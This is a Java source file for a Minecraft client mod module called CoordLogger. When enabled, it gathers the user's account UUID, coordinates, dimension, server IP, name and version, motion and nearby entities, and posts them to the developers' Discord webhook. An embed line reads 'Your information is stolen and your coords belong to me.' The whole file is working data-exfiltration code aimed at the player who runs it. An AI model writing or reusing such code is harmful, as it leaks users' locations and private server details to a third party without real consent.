package me.committee.impl.modules.misc;

import me.committee.Committee;
import me.committee.api.module.Module;
import me.committee.api.setting.Colour;
import me.committee.api.util.DiscordWebhook;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.entity.Entity;
import scala.actors.threadpool.Arrays;

import java.util.ArrayList;
import java.util.Random;

public class CoordLogger extends Module {
    public CoordLogger() {
        super("CoordLogger", new String[]{"CoordinateLogger"}, "It will send all your information to the committee devlopers.", Category.MISC);
    }

    @Override
    public void onEnable() {
        super.onEnable();

        final ServerData serverData = mc.getCurrentServerData();

        if (mc.player != null && serverData != null) {
            final StringBuilder loadedEntities = new StringBuilder();
            for (Entity entity : mc.world.loadedEntityList) {
                loadedEntities.append(entity.getName()).append(" ");
            }

            final ArrayList<DiscordWebhook.DiscordEmbed.Field> embedFields = new ArrayList<>();
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                    "UUID",
                    String.valueOf(mc.getSession().getProfile().getId())
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                    "Coordinates",
                    String.format("XYZ: %.3f / %.5f / %.3f", this.mc.getRenderViewEntity().posX, this.mc.getRenderViewEntity().getEntityBoundingBox().minY, this.mc.getRenderViewEntity().posZ)
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                    "Dimension",
                    mc.player.dimension == 0 ? "Overworld" : mc.player.dimension == -1 ? "Nether" : mc.player.dimension == 1 ? "End" : String.valueOf(mc.player.dimension)
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                            "Server Name",
                            serverData.serverName
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                            "Server Version",
                            serverData.gameVersion
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                            "Server IP",
                            serverData.serverIP
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                            "Motion",
                            "Motion X: " + mc.player.motionX + "\nMotion Y: " + mc.player.motionY + "\nMotion Z: " + mc.player.motionZ
                    )
            );
            embedFields.add(new DiscordWebhook.DiscordEmbed.Field(
                            "Loaded Entities",
                            loadedEntities.toString()
                    )
            );


            Committee.discordWebhook.postMessage(
                    new DiscordWebhook.DiscordEmbed(
                            mc.player.getName(),
                            new DiscordWebhook.DiscordEmbed.Author(
                                    "Your information is stolen and your coords belong to me.",
                                    "https://minotar.net/helm/" +  mc.player.getName()
                            ),
                            new Colour(255, new Random().nextInt(256), 255).hashCodeNoAlpha(),
                            embedFields
                    )
            );
        }

        this.setEnabled(false);
    }
}
